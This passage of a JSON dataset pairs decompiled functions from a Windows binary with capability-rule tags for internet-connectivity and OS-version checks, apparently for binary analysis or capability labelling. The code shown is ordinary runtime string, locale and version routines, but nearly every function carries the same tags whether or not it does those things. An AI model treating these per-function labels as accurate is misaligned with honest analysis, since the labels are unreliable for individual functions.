}\n                }\n                else {\n                    fcn.0040b970(&stack0xfffffffc);\n                }\n            }\n            fcn.0040b850();\n            fcn.0040b70c();\n            if ((*0x485750 != '\\0') && (iVar2 = fcn.00404bcc(),  iVar2 != 0)) {\n                if (**0x4856a4 - 0x30U < 10) {\n                    fcn.0040b8d4();\n                }\n                else {\n                    do {\n                        while ((iVar2 = fcn.00404888(),  *param_2 <= iVar2 && (*(in_EAX + -1 + *param_2) != ' '))) {\n                            *param_2 = *param_2 + 1;\n                        }\n                        fcn.0040b70c();\n                        iVar2 = fcn.00404888();\n                        if (iVar2 < *param_2) break;\n                        fcn.00404888();\n                        fcn.00404ae8();\n                        iVar2 = fcn.00408ab8();\n                        if (iVar2 == 0) break;\n                        fcn.00404888();\n                        fcn.00404ae8();\n                        iVar2 = fcn.00408ab8();\n                    } while (iVar2 != 0);\n                }\n            }\n            var_9h = fcn.0040a84c(var_8h);\n            in_stack_ffffffac = var_8h;\n        }\n    }\ncode_r0x0040bccc:\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.004045ec(0x40bcee);\n    return;\n}\n",
        "token_count": 1303
    },
    "0040bd10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040bd10(void)\n\n{\n    char cVar1;\n    ushort extraout_var;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *in_stack_ffffffd0;\n    uint16_t in_stack_ffffffd4;\n    uchar *puVar4;\n    ushort uVar5;\n    uint32_t uStack32;\n    ushort uStack28;\n    ushort uStack26;\n    uchar auStack24 [4];\n    uchar auStack20 [4];\n    \n    uVar2 = 0;\n    iVar3 = -1;\n    cVar1 = fcn.0040b7c4();\n    if ((cVar1 == '\\0') && (cVar1 = fcn.0040b7c4(),  cVar1 == '\\0')) {\n        cVar1 = fcn.0040b7c4();\n        if ((cVar1 != '\\0') || (cVar1 = fcn.0040b7c4(),  cVar1 != '\\0')) {\n            iVar3 = 0xc;\n        }\n    }\n    else {\n        iVar3 = 0;\n    }\n    if (-1 < iVar3) {\n        fcn.0040b70c();\n    }\n    cVar1 = fcn.0040b730(&stack0xffffffec);\n    if (cVar1 != '\\0') {\n        uStack32 = uStack32 & 0xffff;\n        uStack28 = 0;\n        uStack26 = 0;\n        uVar5 = 0x40;\n        cVar1 = fcn.0040b850();\n        if (cVar1 != '\\0') {\n            puVar4 = &stack0xffffffe8;\n            cVar1 = fcn.0040b730(puVar4);\n            uVar5 = puVar4 >> 0x10;\n            if (cVar1 == '\\0') {\n                return 0;\n            }\n            in_stack_ffffffd4 = 0xbdee;\n            cVar1 = fcn.0040b850();\n            if (cVar1 != '\\0') {\n                puVar4 = &stack0xffffffe4;\n                cVar1 = fcn.0040b730(puVar4);\n                in_stack_ffffffd4 = puVar4;\n                if (cVar1 == '\\0') {\n                    return 0;\n                }\n                in_stack_ffffffd0 = 0x40be1b;\n                cVar1 = fcn.0040b850();\n                if (cVar1 != '\\0') {\n                    in_stack_ffffffd0 = &stack0xffffffe0;\n                    cVar1 = fcn.0040b730(in_stack_ffffffd0);\n                    if (cVar1 == '\\0') {\n                        return 0;\n                    }\n                }\n            }\n        }\n        if (iVar3 < 0) {\n            cVar1 = fcn.0040b7c4();\n            if ((cVar1 == '\\0') && (cVar1 = fcn.0040b7c4(),  cVar1 == '\\0')) {\n                cVar1 = fcn.0040b7c4();\n                if ((cVar1 != '\\0') || (cVar1 = fcn.0040b7c4(),  cVar1 != '\\0')) {\n                    iVar3 = 0xc;\n                }\n            }\n            else {\n                iVar3 = 0;\n            }\n        }\n        if ((iVar3 < 0) || ((in_stack_ffffffd4 != 0 && (in_stack_ffffffd4 < 0xd)))) {\n            fcn.0040b70c();\n            uVar2 = fcn.0040a704(in_stack_ffffffd0, CONCAT22(extraout_var, uVar5));\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 835
    },
    "0040c154": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c154(int32_t *arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.0040c0e0(arg_8h);\n    if (*arg_8h == 0) {\n        fcn.0040675c();\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0040c2b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c2b4(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 1;\n    while( true ) {\n        if (*(iVar1 * 4 + 0x485750) == 0) {\n            fcn.004047c0();\n            return 1;\n        }\n        if (iVar1 == 7) break;\n        iVar1 = iVar1 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 106
    },
    "0040c7e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040c7e4(void)\n\n{\n    uint uVar1;\n    uint uStack1128;\n    uchar *puStack1124;\n    uchar *puStack1120;\n    uint uStack1116;\n    uchar *puStack1112;\n    uint uStack1108;\n    uchar *puStack1104;\n    uchar *puStack1100;\n    uchar auStack1092 [48];\n    uchar auStack1044 [8];\n    uchar auStack1036 [8];\n    uchar auStack1028 [1028];\n    \n    puStack1100 = 0x40c7f8;\n    fcn.0040c64c(0x400);\n    if (**0x4846fc == '\\0') {\n        puStack1100 = 0x40;\n        puStack1104 = &stack0xfffffbbc;\n        uStack1108 = *(*0x4843d0 + 4);\n        puStack1112 = 0x40c87a;\n        puStack1112 = fcn.00405c20();\n        uStack1116 = 0x40c880;\n        sub.user32.dll_LoadStringA_1();\n        uStack1116 = 0x2010;\n        puStack1120 = &stack0xfffffbac;\n        puStack1124 = &stack0xfffffbec;\n        uStack1128 = 0;\n        sub.user32.dll_MessageBoxA_1();\n    }\n    else {\n        puStack1100 = 0x40c80c;\n        fcn.00402ff8();\n        puStack1100 = 0x40c811;\n        fcn.00402ca0();\n        puStack1100 = &stack0xfffffbfc;\n        puStack1104 = &stack0xfffffbfc;\n        puStack1112 = &stack0xfffffbb0;\n        uStack1108 = 0x40c820;\n        sub.user32.dll_CharToOemA();\n        uStack1108 = 0;\n        uStack1116 = 0x40c830;\n        uStack1116 = fcn.0040928c();\n        puStack1120 = &stack0xfffffbf4;\n        puStack1124 = 0xfffffff4;\n        uStack1128 = 0x40c83d;\n        uStack1128 = sub.kernel32.dll_GetStdHandle_1();\n        sub.kernel32.dll_WriteFile_1();\n        uVar1 = sub.kernel32.dll_GetStdHandle_1(0xfffffff4, 0x40c8a8, 2, &stack0xfffffb98, 0);\n        sub.kernel32.dll_WriteFile_1(uVar1);\n    }\n    return;\n}\n",
        "token_count": 589
    },
    "0040cd38": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040cd38(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *puVar3;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint lpFilename;\n    uint lpBuffer;\n    uint hModule;\n    int32_t var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack384 = &stack0xfffffffc;\n    var_150h = 0;\n    var_158h = 0;\n    var_154h = 0;\n    var_4h = 0;\n    uStack388 = 0x40cefb;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack392;\n    iVar1 = *(arg_8h + -4);\n    if (*(iVar1 + 0x14) == 0) {\n        puStack384 = &stack0xfffffffc;\n        fcn.0040675c();\n    }\n    else {\n        fcn.0040675c();\n    }\n    var_8h = *(iVar1 + 0x18);\n    sub.kernel32.dll_VirtualQuery_1(*(iVar1 + 0xc), &lpBuffer, 0x1c);\n    if (var_14h == 0x1000) {\n        iVar2 = sub.kernel32.dll_GetModuleFileNameA_1(hModule, &lpFilename, 0x105);\n        if (iVar2 != 0) {\n            var_14ch = *(iVar1 + 0xc);\n            var_148h._0_1_ = 5;\n            fcn.00404838();\n            fcn.00409150();\n            var_144h = var_150h;\n            var_140h._0_1_ = 0xb;\n            var_13ch = var_4h;\n            var_138h._0_1_ = 0xb;\n            var_134h = var_8h;\n            var_130h._0_1_ = 5;\n            puVar3 = &var_14ch;\n            arg_8h_00 = 3;\n            fcn.0040675c();\n            fcn.0040c918(arg_8h_00, puVar3);\n            goto code_r0x0040ceca;\n        }\n    }\n    var_170h = *(iVar1 + 0xc);\n    var_16ch._0_1_ = 5;\n    var_168h = var_4h;\n    var_164h._0_1_ = 0xb;\n    var_160h = var_8h;\n    var_15ch._0_1_ = 5;\n    puVar3 = &var_170h;\n    arg_8h_00 = 2;\n    fcn.0040675c();\n    fcn.0040c918(arg_8h_00, puVar3);\ncode_r0x0040ceca:\n    *in_FS_OFFSET = arg_8h_00;\n    fcn.004045c8(0x40cf02);\n    fcn.004045ec();\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 863
    },
    "0040d06c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040d06c(void)\n\n{\n    if (*0x485798 != NULL) {\n        *(*0x485798 + 3) = 1;\n        (**(**0x485798 + -8))();\n        *0x485798 = NULL;\n    }\n    if (*0x48579c != 0) {\n        *(*0x48579c + 0xc) = 1;\n        fcn.00403820();\n        *0x48579c = 0;\n    }\n    **0x484308 = 0;\n    **0x484480 = 0;\n    **0x4843b4 = 0;\n    **0x484450 = 0;\n    **0x48448c = 0;\n    **0x48465c = 0;\n    return;\n}\n",
        "token_count": 179
    },
    "0040d0ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040d0ec(void)\n\n{\n    int32_t iVar1;\n    uint uStack148;\n    uint uStack144;\n    uint32_t uStack140;\n    int32_t iStack136;\n    \n    uStack148 = 0x94;\n    iVar1 = sub.kernel32.dll_GetVersionExA(&uStack148);\n    if (iVar1 != 0) {\n        *0x4830c8 = iStack136;\n        *0x4830cc = uStack148;\n        *0x4830d0 = uStack144;\n        if (iStack136 == 1) {\n            *0x4830d4 = uStack140 & 0xffff;\n        }\n        else {\n            *0x4830d4 = uStack140;\n        }\n        fcn.00404838();\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "0040d268": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040d268(uint param_1, int32_t param_2)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = 0;\n    if ((in_EAX != NULL) && (in_EAX[param_2] != 0)) {\n        if (param_2 == 0) {\n            if ((*((*in_EAX >> 3) + 0x483110) >> (*in_EAX & 7) & 1) != 0) {\n                uVar2 = 1;\n            }\n        }\n        else {\n            iVar3 = param_2 + -1;\n            while ((-1 < iVar3 && ((*((in_EAX[iVar3] >> 3) + 0x483110) >> (in_EAX[iVar3] & 7) & 1) != 0))) {\n                iVar3 = iVar3 + -1;\n            }\n            uVar1 = param_2 - iVar3 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == 0) {\n                uVar2 = 2;\n            }\n            else if ((*((in_EAX[param_2] >> 3) + 0x483110) >> (in_EAX[param_2] & 7) & 1) != 0) {\n                uVar2 = 1;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 361
    },
    "0040d2e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040d2e0(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*0x485750 != '\\0') {\n        fcn.00404a88();\n        uVar1 = fcn.0040d268();\n    }\n    return uVar1;\n}\n",
        "token_count": 72
    },
    "0040d304": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040d304(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*0x485750 != '\\0') {\n        uVar1 = fcn.0040d268();\n    }\n    return uVar1;\n}\n",
        "token_count": 61
    },
    "0040d344": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040d344(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (0 < param_2) {\n        iVar1 = fcn.00404888();\n        if ((param_2 <= iVar1) && (iVar3 = param_2,  *0x485750 != '\\0')) {\n            iVar1 = 1;\n            iVar3 = 0;\n            if (0 < param_2) {\n                do {\n                    uVar2 = *(in_EAX + -1 + iVar1);\n                    if ((*((uVar2 >> 3) + 0x483110) >> (uVar2 & 7) & 1) == 0) {\n                        iVar1 = iVar1 + 1;\n                    }\n                    else {\n                        iVar1 = fcn.0040d564();\n                    }\n                    iVar3 = iVar3 + 1;\n                } while (iVar1 <= param_2);\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 256
    },
    "0040d430": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040d430(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *in_stack_ffffffec;\n    uchar *puVar3;\n    int32_t iStack16;\n    \n    puVar3 = &stack0xfffffff0;\n    iStack16 = 0;\n    iVar2 = iStack16;\n    if (0 < param_2) {\n        in_stack_ffffffec = 0x40d449;\n        iVar1 = fcn.00404888();\n        iVar2 = iStack16;\n        if (((param_2 <= iVar1) && (iVar2 = param_2,  1 < param_2)) && (iVar2 = param_2,  *0x485750 != '\\0')) {\n            fcn.0040d3a0(&stack0xfffffff0);\n            if ((iStack16 < param_2 + -1) || (iVar2 = fcn.00404888(),  iVar2 <= puVar3)) {\n                in_stack_ffffffec = NULL;\n                iVar2 = iStack16;\n            }\n            else {\n                in_stack_ffffffec = puVar3 + 1;\n                iVar2 = iStack16;\n            }\n        }\n    }\n    iStack16 = iVar2;\n    return CONCAT44(iStack16, in_stack_ffffffec);\n}\n",
        "token_count": 306
    },
    "0040d494": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040d494(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *in_stack_ffffffec;\n    uchar *puVar3;\n    int32_t iStack16;\n    \n    puVar3 = &stack0xfffffff0;\n    iStack16 = 0;\n    iVar1 = iStack16;\n    if (0 < param_2) {\n        in_stack_ffffffec = 0x40d4ad;\n        iVar1 = fcn.00404888();\n        if (iVar1 < param_2) {\n            in_stack_ffffffec = 0x40d4b8;\n            param_2 = fcn.00404888();\n        }\n        iVar1 = param_2;\n        if (*0x485750 != '\\0') {\n            fcn.0040d3a0(&stack0xfffffff0);\n            iVar2 = fcn.00404888();\n            in_stack_ffffffec = puVar3;\n            iVar1 = iStack16;\n            if (iVar2 < puVar3) {\n                in_stack_ffffffec = fcn.00404888();\n                iVar1 = iStack16;\n            }\n        }\n    }\n    iStack16 = iVar1;\n    return CONCAT44(iStack16, in_stack_ffffffec);\n}\n",
        "token_count": 297
    },
    "0040d4f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0040d4f4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*0x485750 != '\\0') {\n        iVar1 = sub.user32.dll_CharNextA_1();\n        return iVar1 - in_EAX;\n    }\n    return 1;\n}\n",
        "token_count": 75
    },
    "0040d528": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040d528(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = 1;\n    if ((*0x485750 != '\\0') && (uVar2 = *(in_EAX + -1 + param_2),  (*((uVar2 >> 3) + 0x483110) >> (uVar2 & 7) & 1) != 0)\n       ) {\n        fcn.00404a88();\n        uVar1 = fcn.0040d4f4();\n    }\n    return uVar1;\n}\n",
        "token_count": 153
    },
    "0040d564": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040d564(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = param_2 + 1;\n    if ((*0x485750 != '\\0') && (uVar2 = *(in_EAX + -1 + param_2),  (*((uVar2 >> 3) + 0x483110) >> (uVar2 & 7) & 1) != 0)\n       ) {\n        fcn.00404a88();\n        iVar1 = fcn.0040d4f4();\n        iVar1 = iVar1 + param_2;\n    }\n    return iVar1;\n}\n",
        "token_count": 168
    },
    "0040d5a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040d5a0(uint param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0;\n    uVar1 = fcn.00404a88(param_1);\n    iVar2 = fcn.00404a88(uVar1);\n    iVar3 = fcn.0040d668();\n    if (iVar3 != 0) {\n        iVar4 = (iVar3 - iVar2) + 1;\n    }\n    return CONCAT44(iVar3, iVar4);\n}\n",
        "token_count": 136
    },
    "0040d5dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040d5dc(uint param_1, uint32_t *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    if (*0x485750 == '\\0') {\n        uVar4 = fcn.00408a4c();\n    }\n    else {\n        iVar3 = fcn.00404888();\n        uVar4 = fcn.00404c14();\n        iVar6 = 1;\n        if (0 < iVar3) {\n            do {\n                iVar5 = fcn.00404ae0();\n                *(iVar5 + -1 + iVar6) = *(in_EAX + -1 + iVar6);\n                uVar4 = *(in_EAX + -1 + iVar6);\n                if ((*((uVar4 >> 3) + 0x483110) >> (uVar4 & 7) & 1) == 0) {\n                    cVar2 = *((*param_2 - 1) + iVar6);\n                    uVar4 = *param_2 & 0xffffff00 | cVar2 + 0xa5;\n                    if (cVar2 + 0xbfU < 0x1a) {\n                        uVar4 = fcn.00404ae0();\n                        pcVar1 = (uVar4 - 1) + iVar6;\n                        *pcVar1 = *pcVar1 + ' ';\n                    }\n                }\n                else {\n                    iVar6 = iVar6 + 1;\n                    uVar4 = fcn.00404ae0();\n                    *((uVar4 - 1) + iVar6) = *(in_EAX + -1 + iVar6);\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 <= iVar3);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 432
    },
    "0040d668": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040d668(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack20;\n    \n    iVar4 = 0;\n    if ((((in_EAX != NULL) && (*in_EAX != '\\0')) && (param_2 != NULL)) && (*param_2 != '\\0')) {\n        iStack20 = fcn.0040928c();\n        uVar2 = fcn.0040928c();\n        for (iVar4 = fcn.00409440(); (iVar4 != 0 && (uVar2 <= iStack20 - (iVar4 - in_EAX)));\n            iVar4 = fcn.00409440(iVar4 + 1)) {\n            cVar1 = fcn.0040d304();\n            if (cVar1 != '\\x02') {\n                iVar4 = 0x400;\n                iVar3 = sub.kernel32.dll_CompareStringA();\n                if (iVar3 == 2) goto code_r0x0040d71b;\n            }\n            if (cVar1 == '\\x01') {\n                iVar4 = iVar4 + 1;\n            }\n        }\n        iVar4 = 0;\n    }\ncode_r0x0040d71b:\n    return CONCAT44(iStack20, iVar4);\n}\n",
        "token_count": 317
    },
    "0040d728": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040d728(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack12;\n    \n    iStack12 = fcn.0040d770();\n    iVar2 = iStack12;\n    if (param_2 != '\\0') {\n        while (iVar1 = iVar2,  iVar1 != 0) {\n            iVar2 = fcn.0040d770(iVar1 + 1);\n            iStack12 = iVar1;\n        }\n    }\n    return CONCAT44(iStack12, iStack12);\n}\n",
        "token_count": 137
    },
    "0040d770": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040d770(uint param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    for (iVar2 = fcn.00409420(param_1); iVar2 != 0; iVar2 = fcn.00409420(iVar2 + 1)) {\n        cVar1 = fcn.0040d304();\n        if (cVar1 == '\\0') break;\n        if (cVar1 == '\\x01') {\n            iVar2 = iVar2 + 1;\n        }\n    }\n    return CONCAT44(iVar2, iVar2);\n}\n",
        "token_count": 133
    },
    "0040da1c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.0040da1c(void)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint *in_FS_OFFSET;\n    uint *var_40h;\n    uint *var_3ch;\n    uint *var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    iVar1 = 8;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_14h = 0x40dce7;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0040da1c::var_18h;\n    var_1ch = 0x40da3f;\n    var_ch = unaff_EBX;\n    fcn.0040d8a4();\n    var_1ch = 0x40da44;\n    fcn.0040c190();\n    if (*0x485750 != '\\0') {\n        var_1ch = 0x40da52;\n        fcn.0040c368();\n    }\n    var_1ch = 0x40da57;\n    sub.kernel32.dll_GetThreadLocale_1();\n    var_1ch = &fcn.0040da1c::var_10h;\n    var_20h = 0x40da6b;\n    fcn.0040c0e0(var_1ch);\n    var_20h = 0x40da78;\n    fcn.0040461c();\n    var_20h = &fcn.0040da1c::var_14h;\n    var_24h = 0x40da8d;\n    fcn.0040c0e0(var_20h);\n    var_24h = 0x40da97;\n    *0x485688 = fcn.00408da0();\n    var_24h = &fcn.0040da1c::var_18h;\n    var_28h = 0x40dab1;\n    fcn.0040c0e0(var_24h);\n    var_28h = 0x40dabb;\n    *0x485689 = fcn.00408da0();\n    var_28h = 0x40dace;\n    *0x48568a = fcn.0040c12c();\n    var_28h = 0x40dae1;\n    *0x48568b = fcn.0040c12c();\n    var_28h = &fcn.0040da1c::var_1ch;\n    var_2ch = 0x40dafb;\n    fcn.0040c0e0(var_28h);\n    var_2ch = 0x40db05;\n    *0x48568c = fcn.00408da0();\n    var_2ch = 0x40db18;\n    *0x48568d = fcn.0040c12c();\n    var_2ch = &fcn.0040da1c::var_24h;\n    var_30h = 0x40db32;\n    fcn.0040c0e0(var_2ch);\n    var_30h = 0x40db3d;\n    fcn.0040c418();\n    var_30h = 0x40db4a;\n    fcn.0040461c();\n    var_30h = &fcn.0040da1c::var_2ch;\n    var_34h = 0x40db5f;\n    fcn.0040c0e0(var_30h);\n    var_34h = 0x40db6a;\n    fcn.0040c418();\n    var_34h = 0x40db77;\n    fcn.0040461c();\n    var_34h = 0x40db85;\n    *0x485698 = fcn.0040c12c();\n    var_34h = &fcn.0040da1c::var_30h;\n    var_38h = 0x40db9f;\n    fcn.0040c0e0(var_34h);\n    var_38h = 0x40dbac;\n    fcn.0040461c();\n    var_38h = &fcn.0040da1c::var_34h;\n    var_3ch = 0x40dbc1;\n    fcn.0040c0e0(var_38h);\n    var_3ch = 0x40dbce;\n    fcn.0040461c();\n    var_3ch = 0x40dbd6;\n    fcn.004045c8();\n    var_3ch = 